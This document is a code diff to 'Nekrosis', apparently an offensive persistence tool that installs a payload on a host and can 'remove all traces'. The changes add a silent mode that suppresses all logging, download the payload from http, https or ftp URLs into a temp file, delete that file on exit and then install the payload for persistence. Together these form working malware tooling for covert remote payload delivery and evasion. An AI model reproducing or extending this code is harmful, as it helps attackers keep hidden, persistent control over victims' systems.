@@ -7,10 +7,12 @@ or as a standalone application through the main() function.
 
 import os
 import sys
+import atexit
 import ctypes
 import logging
 import argparse
 import requests
+import tempfile
 
 from pathlib import Path
 
@@ -54,12 +56,12 @@ class Nekrosis:
         - nuke()
     """
 
-    def __init__(self, payload: str, custom_method: str = None, nuke: bool = False) -> None:
+    def __init__(self, payload: str, custom_method: str = None, nuke: bool = False, silent: bool = False) -> None:
         self._payload       = payload
         self._custom_method = custom_method
         self._nuke          = nuke
 
-        self._init_logging()
+        self._init_logging(silent=silent)
 
         self.persistence_obj: Persistence = None
 
@@ -92,7 +94,7 @@ class Nekrosis:
         )
 
 
-    def _init_logging(self, verbose: bool = False) -> None:
+    def _init_logging(self, verbose: bool = False, silent: bool = False) -> None:
         """
         Initialize logging.
         """
@@ -103,10 +105,9 @@ class Nekrosis:
             level=logging.INFO,
             format="%(message)s" if verbose is False else "[%(levelname)-8s] [%(filename)-20s]: %(message)s",
             handlers=[
-                logging.StreamHandler()
+                logging.StreamHandler() if silent is False else logging.NullHandler()
             ]
         )
-
 
     def _verify_payload(self) -> None:
         """
@@ -176,19 +177,21 @@ class Nekrosis:
         self._payload = payload
         self.persistence_obj.payload = payload
 
-    def download_payload(self, payload: str) -> bool:
+    def download_payload(self, url: str) -> bool:
         """
-        Download the payload from a webserver
+        Download the payload from a web server
         """
         try:
-            response = requests.get(payload)
+            response = requests.get(url, timeout=5)
             if response.status_code == 200:
-                with open("download", "wb") as f:
+                file = tempfile.mktemp()
+                with open(file, "wb") as f:
                     f.write(response.content)
-                logging.info("Payload downloaded successfully.")
+                logging.info(f"Payload successfully downloaded to: {file}")
 
-                self._payload = payload
-                self.persistence_obj.payload = payload
+                self.change_payload(file)
+                atexit.register(os.remove, file)
+
                 return True
             else:
                 logging.error(f"Failed to download payload. Status code: {response.status_code}")
@@ -276,7 +279,7 @@ def main():
         "-p",
         "--payload",
         action="store",
-        help="The payload to install. This can either be a local file or one from a webserver"
+        help="The payload to install. This can either be a local file or one from a web server"
     )
     parser.add_argument(
         "-m",
@@ -305,30 +308,36 @@ def main():
         "-n",
         "--nuke",
         action="store_true",
-        help="Remove all traces of Nekrosis and the original payload."
+        help="Remove all traces of Nekrosis and the original payload.",
+        default=False
+    )
+    parser.add_argument(
+        "-s",
+        "--silent",
+        action="store_true",
+        help="Silence all output.",
+        default=False
     )
 
     args = parser.parse_args()
 
-    if args.payload:
-            if args.payload.startswith("http://") or args.payload.startswith("https://"):
-                nekrosis = Nekrosis(payload=args.payload, custom_method=args.method, nuke=args.nuke if args.nuke else False)
-                if nekrosis.download_payload(args.payload):
-                    nekrosis.change_payload("download")
-                    nekrosis.install()
-            else:
-                nekrosis = Nekrosis(payload=args.payload, custom_method=args.method, nuke=args.nuke if args.nuke else False)
+    payload = args.payload
+    if args.payload is None and (args.list_supported_methods or args.export):
+        # Set payload to self to avoid errors
+        # When listing or exporting, the payload is not used
+        payload = sys.argv[0]
 
-                if args.list_supported_methods or args.export:
-                    if args.export:
-                        print(nekrosis.export_persistence_methods(ExportPersistenceTypes(args.export)), end="")
-                    else:
-                        nekrosis._list_supported_persistence_methods()
-                else:
-                    nekrosis.install()
-    else:
+    if payload is None:
         parser.print_help()
         sys.exit(0)
 
-if __name__ == "__main__":
-    main()
+    nekrosis = Nekrosis(payload=payload, custom_method=args.method, nuke=args.nuke, silent=args.silent)
+    if args.list_supported_methods:
+        nekrosis._list_supported_persistence_methods()
+    elif args.export:
+        print(nekrosis.export_persistence_methods(ExportPersistenceTypes(args.export)), end="")
+    else:
+        if any([args.payload.startswith(f"{protocol}://") for protocol in ["http", "https", "ftp", "ftps"]]):
+            if nekrosis.download_payload(args.payload) is False:
+                sys.exit(1)
+        nekrosis.install()
